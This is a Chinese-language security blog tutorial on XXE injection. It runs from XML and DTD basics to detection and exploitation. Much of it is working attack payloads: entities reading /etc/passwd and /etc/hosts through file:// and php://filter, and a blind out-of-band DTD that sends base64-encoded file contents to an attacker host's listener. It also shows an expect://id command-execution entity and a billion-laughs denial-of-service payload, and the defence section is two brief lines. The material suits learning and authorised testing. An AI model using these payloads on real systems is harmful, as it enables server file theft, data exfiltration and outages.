---
title: "XXE XML 外部实体注入"
permalink: xxe-injection/
date: 2025-12-17 01:20:16
categories:
  - 网络安全
  - Web 安全
tags:
  - XXE
  - XML
  - Web安全
img: /medias/featureimages/18.jpg
summary: "XXE 的成因、内外部实体注入、OOB 外带、伪协议利用与防御方案。"
---

<!-- more -->

## 前置基础
## XML 可扩展标记语言
```xml
<?xml version="1.0" encoding="UTF-8"?>
<kls>
    <students>
        <student>
            <name>han</name>
            <age>20</age>
        </student>
        <student>
            <name>liu</name>
            <age>21</age>
        </student>
        <student>
            <name>sun</name>
            <age>22</age>
        </student>
    </students>
    <teachers>
        <teacher>
            <name>wanglao</name>
            <age>40</age>
        </teacher>
    </teachers>
</kls>
```

+ xml header (头)中制定了 xml 的版本信息，和字符集编码
+ xml body(体) 中开始标签和结束 标签对应，标签名随意

## DTD 文档类型定义
+ 作用：约束xml 的书写规范
+ XML  正常情况下标签的名字可以随意指定，也可以使用 DTD 进行约束

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE kls07 [
    <!ELEMENT kls07 (students, teachers)>
    <!ELEMENT students (student+)>
    <!ELEMENT student (name, age)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
    <!ELEMENT teachers (teacher+)>
    <!ELEMENT teacher (name, age)>
]>

<kls07>
    <students>
        <student>
            <name>zhangsan</name>
            <age>20</age>
        </student>
        <student>
            <name>lisi</name>
            <age>21</age>
        </student>
        <student>
            <name>wangwu</name>
            <age>22</age>
        </student>
    </students>
    <teachers>
        <teacher>
            <name>teacher1</name>
            <age>40</age>
        </teacher>
    </teachers>
</kls07>
```

## DTD 实体
DTD 实体，就是DTD 中定义的变量

### 内部实体
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE kls07 [
    <!ELEMENT kls07 (students, teachers)>
    <!ELEMENT students (student+)>
    <!ELEMENT student (name, age)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
    <!ELEMENT teachers (teacher+)>
    <!ELEMENT teacher (name, age)>
    <!ENTITY a "zhangsan">
]>

<kls07>
    <students>
        <student>
            <name>&a;</name>
            <age>20</age>
        </student>
        <student>
            <name>lisi</name>
            <age>21</age>
        </student>
        <student>
            <name>wangwu</name>
            <age>22</age>
        </student>
    </students>
    <teachers>
        <teacher>
            <name>teacher1</name>
            <age>40</age>
        </teacher>
    </teachers>
</kls07>
```

+  实体的定义：DTD中定义实体 <!ENTITY a "zhangsan">，a 为实体名，zhangsan为a实体的值
+  实体的调用：XML中调用实体 &实体名; ，如 &a; ，就是调用a实体，就是zhangsan

### 外部实体
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE kls07 [
    <!ELEMENT kls07 (students, teachers)>
    <!ELEMENT students (student+)>
    <!ELEMENT student (name, age)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
    <!ELEMENT teachers (teacher+)>
    <!ELEMENT teacher (name, age)>
    <!ENTITY a "zhangsan">
    <!ENTITY b SYSTEM "https://www.baidu.com">
]>

<kls07>
    <students>
        <student>
            <name>&a;</name>
            <age>&b;</age>
        </student>
        <student>
            <name>lisi</name>
            <age>21</age>
        </student>
        <student>
            <name>wangwu</name>
            <age>22</age>
        </student>
    </students>
    <teachers>
        <teacher>
            <name>teacher1</name>
            <age>40</age>
        </teacher>
    </teachers>
</kls07>
```

外部实体定义：DTD中<!ENTITY b SYSTEM "https://www.baidu.com"> ，外部实体的值是 URL，且有SYSTEM字符

外部实体调用：XML中 &实体名;

### 参数实体
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE kls07 [
    <!ELEMENT kls07 (students, teachers)>
    <!ELEMENT students (student+)>
    <!ELEMENT student (name, age)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
    <!ELEMENT teachers (teacher+)>
    <!ELEMENT teacher (name, age)>
    <!ENTITY a "zhangsan">
    <!ENTITY b SYSTEM "https://www.baidu.com">
    <!ENTITY % c SYSTEM "hello">
    %c;
]>

<kls07>
    <students>
        <student>
            <name>&a;</name>
            <age>&b;</age>
        </student>
        <student>
            <name>lisi</name>
            <age>21</age>
        </student>
        <student>
            <name>wangwu</name>
            <age>22</age>
        </student>
    </students>
    <teachers>
        <teacher>
            <name>teacher1</name>
            <age>40</age>
        </teacher>
    </teachers>
</kls07>
```

参数实体的定义：DTD中写:  <!ENTITY   %   c  SYSTEM   "hello">, c 是实体名，hello 是实体值， 参数实体的定义需要有 %

参数实体的调用：参数实体只能在 DTD中调用，%实体名; ,如 %c;

## 产生原因
**开发者没有对用户传入的xml 做严格的限制,  导致用户可以传入任意的xml，且服务器允许加载外部实体**

## 挖掘
## 代码审计
```xml
找是否有 xml 解析相关的函数、依赖. 如 php 的 loadXML、libxml
看用户是否能够传入 xml 。如php看 php://input

看服务器是否能够加载外部实体。如php中 看到 libxml_disable_entity_loader(false) 、
libxml_use_internal_errors(true)，就是允许实体加载。
```

下图代码所示，1、2、3均满足，故存在 xxe 漏洞

## 危害
XXE 漏洞可导致敏感文件泄露、SSRF （服务端请求伪造）  、 远程文件读取 / 数据外带  、拒绝服务攻击  ，严重时可配合其他漏洞实现远程代码执行，是一个高危甚至致命的安全漏洞

## 黑盒测试
### 有回显 XXE
```xml
看请求体的类型是不是Content-Type: application/xml,如果不是，可以手动修改，看网站是否支持 xml
传入xml数据，在xml中加入实体，观察xml是否能解析实体
替换实体为外部实体，看是否可以进行利用
```

3  替换实体为外部实体，看是否可以进行利用

### 无回显 XXE/盲打 XXE
#### 1 HTTP 外带
```xml
DTD中定义外部实体，外部实体的值是自己攻击机的URL地址
看攻击机HTTP是否有访问日志, 如果有,就说明存在XXE漏洞
```

#####  方法1 ：攻击机 自行开启监听
攻击机开监听

靶机指定外部 实体值为 URL 地址，访问任意 URI

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY a SYSTEM "http://192.168.2.116:8000/asd">

]>
<root>
    <username>&a;</username>
    <password>password</password>
</root>
```

攻击机看到有对应URI的HTTP访问日志，说明外部实体被加载，有XXE漏洞

##### 方法2： burpsuite Collaborator
⚠️：使用burpsuite collaborator 的域名 oastify.com，部分梯子、家庭网络、防火墙可能会拦截 burpsuite的域名  （ 没有云服务器，如何解决 ）

得到: `58bed80dnyzqph125evmxdep3g97xxlm.oastify.com`, 修改攻击 playload

攻击者在  burpsuite collaborator 中即可看到 HTTP 外带的日志信息

方法3 ： 知道创宇 ceye

[http://ceye.io/](http://ceye.io/)

得到自己的域名：`bvgvem.ceye.io` 替换playload 为自己的域名

攻击如果成功，攻击者 可以得到 HTTP 日志记录

#### 2 dnslog 外带
##### 方法1 ： burpsuite Collaborator
获取 burpsuite 域名

修改攻击的 playload 在域名前加任意子域名

在 burpsuite collaborator 中可以看到 DNS 解析日志，证明xxe漏洞存在

##### 方法2 ： 知道创宇 ceye
[http://ceye.io/](http://ceye.io/)

##### 方法3：其他公共 DNSlog 平台
[https://dig.pm/](https://dig.pm/)

[https://dnslog.org/](https://dnslog.org/)

## 利用
## 1 读取 敏感信息 (伪协议直接读)
外部实体的值，修改为 读取文件的协议

+ file://
+ php://filter-

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY a SYSTEM "file:///etc/passwd">

]>
<root>
    <username>&a;</username>
    <password>password</password>
</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY a SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

]>
<root>
    <username>&a;</username>
    <password>password</password>
</root>
```

## 2 外部 DTD(有回显)
读取 敏感信息 (伪协议直接读) ，需要使用 php://filter  和 file://, 可能会被 WAF 拦截，可以把 dtd 单独保存为一个文件，并放到 攻击机中

### 1 攻击机 编写 1.dtd
`<!ENTITY a SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">`

### 2 攻击机 开监听

构建 1.dtd 下载链接 http://192.168.2.116:8000/1.dtd

### 3 编写 (http://192.168.2.116:8000/1.dtd)链接，攻击目标网站
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % x SYSTEM "http://192.168.2.116:8000/1.dtd">
    %x;

]>
<root>
    <username>&a;</username>
    <password>password</password>
</root>
```

解释：

+ DTD 中定义并调用了 参数实体 x， 调用x时会加载攻击机上保存的 1.dtd 文件
+ XML body 中调用了攻击机中远程1.dtd文件中的外部实体 a

## 3 盲打XXE ✨
### 1 攻击机 编写 han.dtd 文件
```plain
<!ENTITY % a SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'http://192.168.2.116:8000/?result=%a;'>">
%b;
%c;
```

### 2 攻击机开启监听

### 3 攻击目标网站
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % x SYSTEM "http://192.168.2.116:8000/han.dtd">
    %x;

]>
<root>
    <username>admin</username>
    <password>password</password>
</root>
```

### 4  攻击者收到HTTP日志，
### 得到文件读取的结果

#### 原理

## 4 XXE 命令执行
expect://id (大部分 php 环境 不支持 expect://)

```xml
<!ENTITY % x SYSTEM "expect://id">
%x;
```

## 5 DDos 攻击
[https://chetan-conikee.medium.com/detecting-chained-xxe-xml-external-entity-to-dos-denial-of-service-or-ssrf-server-side-d13df22001c7](https://chetan-conikee.medium.com/detecting-chained-xxe-xml-external-entity-to-dos-denial-of-service-or-ssrf-server-side-d13df22001c7)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lola "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lolb "&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;">
    <!ENTITY lolc "&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;">
    <!ENTITY lold "&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;">
    <!ENTITY lole "&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;">
    <!ENTITY lolf "&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;">
    <!ENTITY lolg "&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;">
    <!ENTITY lolh "&lolog;&lolog;&lolog;&lolog;&lolog;&lolog;&lolog;&lolog;&lolog;&lolog;">
    <!ENTITY loli "&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;">
]>

<root>
    <username>&loli;</username>
    <password>password</password>
</root>
```

## 修复
```plain
禁用外部实体加载
过滤常见协议头 file://，php://filter
```

docker   inspect
